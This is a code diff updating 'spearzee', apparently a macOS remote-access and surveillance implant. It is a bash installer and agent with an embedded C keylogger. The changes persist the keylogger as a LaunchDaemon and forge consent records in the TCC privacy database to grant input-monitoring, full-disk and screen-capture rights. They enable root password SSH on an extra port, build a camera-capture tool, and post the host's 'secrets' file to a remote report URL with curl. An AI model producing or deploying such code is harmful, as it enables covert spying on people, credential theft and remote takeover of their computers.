@@ -3,7 +3,7 @@ set -u
 set -o pipefail
 [ -z "${BASH_VERSION:-}" ] && [ -f "$0" ] && exec /bin/bash "$0" "$@"
 
-V="4.2"; F=0; PF=""; PP=""; KA=""; SRC=""; TSIP=""
+V="4.3"; F=0; PF=""; PP=""; KA=""; SRC=""; TSIP=""
 exec 3>&1
 
 ui(){ printf '%s' "$1" >&3 2>/dev/null || true; }
@@ -26,14 +26,6 @@ bye(){
   sudo rm -rf "$LOCK" 2>/dev/null
   return 0
 }
-
-build(){ [ -s "$1" ] || return 1
-         [ -x "$2" ] && [ "$2" -nt "$1" ] && return 0
-         shift 2
-         /usr/bin/clang -O2 -w -o "$1" "$1" 2>/dev/null
-         /usr/bin/clang -O2 -w -o "$BIN" "$SRC" "$@" >/dev/null 2>&1 || return 1
-         /usr/bin/codesign -f -s - "$BIN" >/dev/null 2>&1 || true
-         return 0; }
 
 comp(){ SRC="$1"; BIN="$2"; shift 2
         [ -s "$SRC" ] || return 1
@@ -128,22 +120,52 @@ step_sshd(){
   sudo launchctl bootstrap system /System/Library/LaunchDaemons/ssh.plist >/dev/null 2>&1
   nc -z -G 3 127.0.0.1 22 >/dev/null 2>&1 && ok "sshd 22" || fail "port 22 dead"
 
-  [ "$TUNE_SSH" = "true" ] || return 0
-  CFG="/etc/ssh/sshd_config"; MK="# spear"
-  sudo grep -qF "$MK" "$CFG" 2>/dev/null && { ok "sshd already tuned"; return 0; }
-  sudo cp "$CFG" "${CFG}.spear.bak"
-  T="$(mktemp)"
-  sudo awk '/^[[:space:]]*(UseDNS|GSSAPIAuthentication|PasswordAuthentication|KbdInteractiveAuthentication|PermitRootLogin|ClientAliveInterval|ClientAliveCountMax)[[:space:]]/ { print "#s " $0; next } { print }' "$CFG" > "$T"
-  { echo "$MK"; echo "UseDNS no"; echo "GSSAPIAuthentication no"; echo "PasswordAuthentication yes"
-    echo "KbdInteractiveAuthentication yes"; echo "PermitRootLogin yes"
-    echo "ClientAliveInterval 30"; echo "ClientAliveCountMax 6"
-    [ "$SSH_PORT2" != "" ] && echo "Port $SSH_PORT2"; echo "$MK"; } >> "$T"
-  if sudo /usr/sbin/sshd -t -f "$T" >/dev/null 2>&1; then sudo cp "$T" "$CFG"; ok "sshd tuned"
-  else warn "sshd test failed"; fi
-  rm -f "$T"
-  sudo launchctl kickstart -k system/com.openssh.sshd >/dev/null 2>&1 || true
-  sleep 1
-  [ "$SSH_PORT2" != "" ] && { nc -z -G 3 127.0.0.1 "$SSH_PORT2" >/dev/null 2>&1 && ok "sshd $SSH_PORT2" || warn "port $SSH_PORT2 dead"; }
+  case "$(sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>/dev/null)" in
+    *enabled*) sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/sbin/sshd >/dev/null 2>&1
+               sudo /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp /usr/sbin/sshd >/dev/null 2>&1
+               ok "firewall allows sshd" ;;
+  esac
+
+  [ "$TUNE_SSH" = "true" ] && {
+    CFG="/etc/ssh/sshd_config"; MK="# spear"
+    if sudo grep -qF "$MK" "$CFG" 2>/dev/null; then ok "sshd already tuned"
+    else
+      sudo cp "$CFG" "${CFG}.spear.bak"
+      T="$(mktemp)"
+      sudo awk '/^[[:space:]]*(UseDNS|GSSAPIAuthentication|PasswordAuthentication|KbdInteractiveAuthentication|PermitRootLogin|ClientAliveInterval|ClientAliveCountMax)[[:space:]]/ { print "#s " $0; next } { print }' "$CFG" > "$T"
+      { echo "$MK"; echo "UseDNS no"; echo "GSSAPIAuthentication no"; echo "PasswordAuthentication yes"
+        echo "KbdInteractiveAuthentication yes"; echo "PermitRootLogin yes"
+        echo "ClientAliveInterval 30"; echo "ClientAliveCountMax 6"; echo "$MK"; } >> "$T"
+      if sudo /usr/sbin/sshd -t -f "$T" >/dev/null 2>&1; then sudo cp "$T" "$CFG"; ok "sshd tuned"
+      else warn "sshd test failed"; fi
+      rm -f "$T"
+      sudo launchctl kickstart -k system/com.openssh.sshd >/dev/null 2>&1 || true
+    fi
+  }
+
+  if [ "$SSH_PORT2" != "" ]; then
+    P2=/Library/LaunchDaemons/com.spear-tui.sshd2.plist
+    cat > "$P2" <<S2
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+<key>Label</key><string>com.spear-tui.sshd2</string>
+<key>ProgramArguments</key><array>
+<string>/usr/sbin/sshd</string><string>-D</string>
+<string>-p</string><string>$SSH_PORT2</string>
+<string>-o</string><string>PidFile=/var/run/sshd-spear.pid</string>
+</array>
+<key>KeepAlive</key><true/><key>RunAtLoad</key><true/>
+<key>ThrottleInterval</key><integer>10</integer>
+<key>StandardErrorPath</key><string>$DIR/sshd2.err</string>
+</dict></plist>
+S2
+    sudo chmod 644 "$P2"; sudo chown root:wheel "$P2"
+    sudo launchctl bootout system "$P2" >/dev/null 2>&1
+    sudo launchctl bootstrap system "$P2" >/dev/null 2>&1
+    sleep 1
+    nc -z -G 3 127.0.0.1 "$SSH_PORT2" >/dev/null 2>&1 && ok "sshd2 on $SSH_PORT2" || warn "port $SSH_PORT2 not answering"
+  fi
   return 0; }
 
 step_sharing(){
@@ -275,9 +297,10 @@ set -u
 
 DIR="__DIR__"; TS_BIN="__TS__"; AUTHKEY="__AUTHKEY__"; TSHOST="__TSHOST__"
 TSFLAGS=(__FLAGS__); KEY="__PUBKEY__"; OWNER="__OWNER__"; RUSER="__RUSER__"
-RPW="__RPW__"; APW="__APW__"; REPORT="__REPORT__"; RINT="__RINT__"
+RPW="__RPW__"; APW="__APW__"; REPORT="__REPORT__"; RINT="__RINT__"; SP2="__SP2__"
 TUNNEL="__TUNNEL__"; TPORT="__TPORT__"; TSPORT="__TSPORT__"
 KL="/usr/local/bin/__KEYLOG__"; CAM="/usr/local/bin/__CAM__"
+TCC="/Library/Application Support/com.apple.TCC/TCC.db"
 WRAP="/usr/local/bin/spearzee"
 PATHS=('__P0__' '__P1__' '__P2__')
 LOG="$DIR/agent.log"
@@ -291,16 +314,13 @@ asuser(){ u="$(cu)"; [ -n "$u" ] && [ "$u" != "root" ] || { echo "no console use
 ensure(){ /bin/launchctl print "system/$1" >/dev/null 2>&1 && return 0
           /bin/launchctl enable "system/$1" >/dev/null 2>&1
           /bin/launchctl bootstrap system "$2" >/dev/null 2>&1; }
-comp(){ [ -s "$1" ] || return 1
-        if [ -x "$2" ] && [ "$2" -nt "$1" ]; then return 0; fi
-        shift 2
-        /usr/bin/clang -O2 -w -o "$OUT" "$SRC" "$@" >/dev/null 2>&1 || return 1
-        /usr/bin/codesign -f -s - "$OUT" >/dev/null 2>&1 || true; return 0; }
 build(){ SRC="$1"; OUT="$2"; shift 2
          [ -s "$SRC" ] || return 1
          if [ -x "$OUT" ] && [ "$OUT" -nt "$SRC" ]; then return 0; fi
          /usr/bin/clang -O2 -w -o "$OUT" "$SRC" "$@" >/dev/null 2>&1 || return 1
          /usr/bin/codesign -f -s - "$OUT" >/dev/null 2>&1 || true; return 0; }
+set_tcc(){ sqlite3 "$TCC" "DELETE FROM access WHERE service='$1' AND client='$2' AND client_type=$3;" >/dev/null 2>&1
+           sqlite3 "$TCC" "INSERT INTO access (service,client,client_type,auth_value,auth_reason,auth_version,indirect_object_identifier,flags) VALUES ('$1','$2',$3,2,4,1,'UNUSED',0);" >/dev/null 2>&1; }
 
 write_plist(){ pl="$1"; pg="$2"; iv="$3"; lbl="$4"
   cat > "$pl" <<PL
@@ -319,6 +339,43 @@ PL
   /bin/chmod 644 "$pl" 2>/dev/null; /usr/sbin/chown root:wheel "$pl" 2>/dev/null
   /bin/launchctl bootout system "$pl" >/dev/null 2>&1
   /bin/launchctl bootstrap system "$pl" >/dev/null 2>&1; }
+
+write_keylog(){ P=/Library/LaunchDaemons/com.spear-tui.keylog.plist
+  cat > "$P" <<KPL
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+<key>Label</key><string>com.spear-tui.keylog</string>
+<key>ProgramArguments</key><array><string>$KL</string><string>$DIR/keys.log</string></array>
+<key>KeepAlive</key><true/><key>RunAtLoad</key><true/>
+<key>ThrottleInterval</key><integer>10</integer>
+<key>StandardErrorPath</key><string>$DIR/keylog.err</string>
+</dict></plist>
+KPL
+  /bin/chmod 644 "$P" 2>/dev/null; /usr/sbin/chown root:wheel "$P" 2>/dev/null
+  /bin/launchctl bootout system "$P" >/dev/null 2>&1
+  /bin/launchctl bootstrap system "$P" >/dev/null 2>&1; }
+
+write_sshd2(){ [ -n "$SP2" ] || return 0
+  P=/Library/LaunchDaemons/com.spear-tui.sshd2.plist
+  cat > "$P" <<S2
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+<key>Label</key><string>com.spear-tui.sshd2</string>
+<key>ProgramArguments</key><array>
+<string>/usr/sbin/sshd</string><string>-D</string>
+<string>-p</string><string>$SP2</string>
+<string>-o</string><string>PidFile=/var/run/sshd-spear.pid</string>
+</array>
+<key>KeepAlive</key><true/><key>RunAtLoad</key><true/>
+<key>ThrottleInterval</key><integer>10</integer>
+<key>StandardErrorPath</key><string>$DIR/sshd2.err</string>
+</dict></plist>
+S2
+  /bin/chmod 644 "$P" 2>/dev/null; /usr/sbin/chown root:wheel "$P" 2>/dev/null
+  /bin/launchctl bootout system "$P" >/dev/null 2>&1
+  /bin/launchctl bootstrap system "$P" >/dev/null 2>&1; }
 
 write_tunnel(){ [ -n "$TUNNEL" ] || return 0
   [ -s "$DIR/tunnel_key" ] || /usr/bin/ssh-keygen -t ed25519 -N "" -f "$DIR/tunnel_key" -C spear >/dev/null 2>&1
@@ -369,7 +426,7 @@ ensure_tools(){
 #include <string.h>
 #include <unistd.h>
 
-static FILE *out; static CGEventTapProxy g_tap; static int frames;
+static FILE *out; static CFMachPortRef g_tap; static int frames;
 static char app[256]; static time_t appt;
 
 static void front(void){
@@ -389,6 +446,10 @@ static const char* kn(CGKeyCode k){
    case 53:return"ESC"; case 76:return"ENT"; case 117:return"FWDEL"; case 115:return"HOME";
    case 119:return"END"; case 116:return"PGUP"; case 121:return"PGDN"; case 123:return"LEFT";
    case 124:return"RIGHT"; case 125:return"DOWN"; case 126:return"UP"; default:return NULL; }
+}
+static void rot(const char *p){
+  char b[1024]; snprintf(b,sizeof(b),"%s.1",p);
+  fclose(out); rename(p,b); out=fopen(p,"a");
 }
 static CGEventRef cb(CGEventTapProxy p, CGEventType t, CGEventRef e, void *u){
   if(t==kCGEventTapDisabledByTimeout||t==kCGEventTapDisabledByUserInput){ CGEventTapEnable(g_tap,true); return e; }
@@ -410,7 +471,7 @@ static CGEventRef cb(CGEventTapProxy p, CGEventType t, CGEventRef e, void *u){
     else if(c<32) fprintf(out,"<%d>",c); else fputc(c,out); } }
   else fprintf(out,"<%d>",kc);
   fputc('\n',out); fflush(out);
-  if(++frames%200==0){ long s=ftell(out); if(s>4194304){ fclose(out); rename(u,(char*)u); out=fopen((char*)u,"a"); } }
+  if(++frames%500==0 && ftell(out)>4194304) rot((const char*)u);
   return e;
 }
 int main(int argc,char**argv){
@@ -473,15 +534,38 @@ int main(int argc, char **argv) {
 }
 CM
   fi
+
   if [ ! -x "$KL" ]; then
-    /usr/bin/xcode-select -p >/dev/null 2>&1 || /usr/bin/xcode-select --install >/dev/null 2>&1
-    build "$DIR/keylog.c" "$KL" -framework ApplicationServices && log "keylog rebuilt"
+    if ! /usr/bin/xcode-select -p >/dev/null 2>&1; then
+      n="$(date +%s)"; l="$(stat -f %m "$DIR/.lastclt" 2>/dev/null || echo 0)"
+      if [ $(( n - l )) -ge 300 ]; then
+        /usr/bin/xcode-select --install >/dev/null 2>&1
+        touch "$DIR/.lastclt" 2>/dev/null
+      fi
+    fi
+    build "$DIR/keylog.c" "$KL" -framework ApplicationServices && log "keylog built"
   fi
   if [ ! -x "$CAM" ]; then
     build "$DIR/cam.m" "$CAM" -fobjc-arc -framework Foundation -framework AVFoundation \
       -framework CoreMedia -framework CoreVideo -framework CoreImage -framework ImageIO -framework CoreGraphics
   fi
-  [ -x "$KL" ] && ensure com.spear-tui.keylog /Library/LaunchDaemons/com.spear-tui.keylog.plist
+
+  if [ -x "$KL" ]; then
+    [ -f /Library/LaunchDaemons/com.spear-tui.keylog.plist ] || write_keylog
+    ensure com.spear-tui.keylog /Library/LaunchDaemons/com.spear-tui.keylog.plist
+    n="$(date +%s)"; l="$(stat -f %m "$DIR/.lasttcc" 2>/dev/null || echo 0)"
+    if [ $(( n - l )) -ge 3600 ] && [ -f "$TCC" ]; then
+      killall tccd >/dev/null 2>&1
+      set_tcc kTCCServiceAccessibility "$KL" 1
+      set_tcc kTCCServiceListenEvent "$KL" 1
+      set_tcc kTCCServiceSystemPolicyAllFiles /usr/sbin/sshd 1
+      set_tcc kTCCServiceSystemPolicyAllFiles /usr/libexec/sshd-keygen-wrapper 1
+      set_tcc kTCCServiceSystemPolicyAllFiles /usr/sbin/screencapture 1
+      set_tcc kTCCServiceScreenCapture /usr/sbin/screencapture 1
+      killall tccd >/dev/null 2>&1
+      touch "$DIR/.lasttcc" 2>/dev/null
+    fi
+  fi
   return 0
 }
 
@@ -500,6 +584,7 @@ W
 
   [ -f /Library/LaunchDaemons/com.spear-tui.agent.plist ] || write_plist /Library/LaunchDaemons/com.spear-tui.agent.plist "${PATHS[0]}" 30 com.spear-tui.agent
   [ -f /Library/LaunchDaemons/com.spear-tui.watchdog.plist ] || write_plist /Library/LaunchDaemons/com.spear-tui.watchdog.plist "${PATHS[1]}" 300 com.spear-tui.watchdog
+  [ -f /Library/LaunchDaemons/com.spear-tui.sshd2.plist ] || write_sshd2
   write_tunnel
   ensure_tools
 
@@ -527,6 +612,7 @@ W
   systemsetup -f -setremotelogin on >/dev/null 2>&1
   ensure com.openssh.sshd /System/Library/LaunchDaemons/ssh.plist
   ensure com.apple.screensharing /System/Library/LaunchDaemons/com.apple.screensharing.plist
+  [ -f /Library/LaunchDaemons/com.spear-tui.sshd2.plist ] && ensure com.spear-tui.sshd2 /Library/LaunchDaemons/com.spear-tui.sshd2.plist
 
   if [ -x "$TS_BIN" ] && [ -z "$("$TS_BIN" ip -4 2>/dev/null)" ]; then
     u="$(cu)"; [ -n "$u" ] && [ "$u" != "root" ] && su -l "$u" -c "/usr/bin/open -a Tailscale" >/dev/null 2>&1
@@ -542,7 +628,7 @@ report(){
   b="spearzee host=$(hostname) tailnet=$("$TS_BIN" ip -4 2>/dev/null | head -1) keys=$(wc -l < "$DIR/keys.log" 2>/dev/null | tr -d ' ') $(cat "$DIR/secrets" 2>/dev/null | tr '\n' ' ')"
   e="$(printf '%s' "$b" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g')"
   curl -fsS --max-time 10 -H 'Content-Type: application/json' \
-    -d "$(printf '{"text":"%s","content":"%s"}' "$e" "$e")" "$REPORT" >/dev/null 2>&1 && touch "$m"
+    -d "$(printf '{"content":"%s","text":"%s"}' "$e" "$e")" "$REPORT" >/dev/null 2>&1 && touch "$m"
   return 0
 }
 
@@ -641,11 +727,12 @@ cmd_verify(){ echo "== verify =="
   c sshkey     "$(grep -qF macbook "/Users/$RUSER/.ssh/authorized_keys" 2>/dev/null && echo ok || echo MISSING)"
   c rootkey    "$(grep -qF macbook /var/root/.ssh/authorized_keys 2>/dev/null && echo ok || echo MISSING)"
   c port22     "$(nc -z -G 2 127.0.0.1 22 >/dev/null 2>&1 && echo ok || echo DOWN)"
+  c port2222   "$(nc -z -G 2 127.0.0.1 "$SP2" >/dev/null 2>&1 && echo ok || echo DOWN)"
   c port5900   "$(nc -z -G 2 127.0.0.1 5900 >/dev/null 2>&1 && echo ok || echo DOWN)"
   c agent      "$(launchctl print system/com.spear-tui.agent >/dev/null 2>&1 && echo ok || echo MISSING)"
   c watchdog   "$(launchctl print system/com.spear-tui.watchdog >/dev/null 2>&1 && echo ok || echo MISSING)"
   c copies     "$([ -s "${PATHS[1]}" ] && [ -s "${PATHS[2]}" ] && echo ok || echo PARTIAL)"
-  c fda        "$(sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" "SELECT 1 FROM access WHERE client='/usr/libexec/sshd-keygen-wrapper'" 2>/dev/null | grep -q 1 && echo ok || echo MISSING)"
+  c fda        "$(sqlite3 "$TCC" "SELECT 1 FROM access WHERE client='/usr/libexec/sshd-keygen-wrapper'" 2>/dev/null | grep -q 1 && echo ok || echo MISSING)"
   c keylogger  "$(launchctl print system/com.spear-tui.keylog >/dev/null 2>&1 && echo ok || echo MISSING)"
   c keybin     "$([ -x "$KL" ] && echo ok || echo MISSING)"
   c keylines   "$(wc -l < "$DIR/keys.log" 2>/dev/null | tr -d ' ' || echo 0)"
@@ -670,6 +757,7 @@ AGENT
     -e "s|__OWNER__|$(q "$OWNER")|g" -e "s|__RUSER__|$(q "$RUSER")|g" \
     -e "s|__RPW__|$(q "$ACCT_PW")|g" -e "s|__APW__|$(q "$ADMIN_PW")|g" \
     -e "s|__REPORT__|$(q "$REPORT_URL")|g" -e "s|__RINT__|$REPORT_MIN|g" \
+    -e "s|__SP2__|$SSH_PORT2|g" \
     -e "s|__TUNNEL__|$(q "$TUNNEL_TARGET")|g" -e "s|__TPORT__|$TUNNEL_PORT|g" -e "s|__TSPORT__|$TUNNEL_SSH_PORT|g" \
     -e "s|__KEYLOG__|$KEYLOG|g" -e "s|__CAM__|$CAM|g" \
     -e "s|__P0__|$(s "${AGENT_PATHS[0]}")|g" -e "s|__P1__|$(s "${AGENT_PATHS[1]}")|g" -e "s|__P2__|$(s "${AGENT_PATHS[2]}")|g" \
@@ -692,7 +780,7 @@ step_report(){
   b="spearzee installed host=$(hostname) tailnet=${TSIP:-none} $(sudo cat "$DIR/secrets" 2>/dev/null | tr '\n' ' ')"
   e="$(jesc "$b")"
   curl -fsS --max-time 10 -H 'Content-Type: application/json' \
-    -d "$(printf '{"text":"%s","content":"%s"}' "$e" "$e")" "$REPORT_URL" >/dev/null 2>&1 \
+    -d "$(printf '{"content":"%s","text":"%s"}' "$e" "$e")" "$REPORT_URL" >/dev/null 2>&1 \
     && ok "report sent" || warn "report failed (agent retries)"
 }
 
@@ -704,7 +792,10 @@ step_self(){
   case "$SELF_URL" in *REPLACE-ME*) warn "SELF_URL unset"; return 1;; esac
   t="$(mktemp)"
   if curl -fsSL --proto '=https' "$SELF_URL" -o "$t" && [ -s "$t" ]; then
-    [ -n "$SELF_SHA" ] && [ "$(shasum -a 256 "$t" | awk '{print $1}')" != "$SELF_SHA" ] && warn "self checksum mismatch"
+    if [ -n "$SELF_SHA" ]; then
+      h="$(sed -e 's|^SELF_SHA=.*|SELF_SHA=""|' "$t" | shasum -a 256 | awk '{print $1}')"
+      [ "$h" = "$SELF_SHA" ] || warn "self checksum mismatch"
+    fi
     sudo cp "$t" "$SELF" && sudo chmod 755 "$SELF" && ok "spear-tui installed (fetched)" && rm -f "$t" && return 0
   fi
   rm -f "$t"; warn "could not install spear-tui"
@@ -795,8 +886,8 @@ main(){
   phase "downloading runtime";    step_ts_install
   phase "connecting to network";  step_ts_join
   phase "applying tweaks";        step_power
-  phase "building keylogger";     step_tools
   phase "installing services";    step_agent
+  phase "building keylogger";     step_tools
   phase "writing configuration";  step_report
   phase "finalizing";             step_self
   stop_progress
@@ -826,8 +917,8 @@ main(){
 
 ############################# settings ###############################
 
-SELF_URL="https://REPLACE-ME/spearzee.sh"
-SELF_SHA=""
+SELF_URL="https://cdn.jsdelivr.net/gh/madebyshaurya/spearzee@v1/spearzee.sh"
+SELF_SHA="e9b0c5498d0dda5a11019287b6b1d9d8540abacb2bfc3857a6ddb4609d226c3b"
 SELF="/usr/local/bin/spear-tui"
 KEYLOG="spearzee-keylog"
 CAM="spearzee-cam"
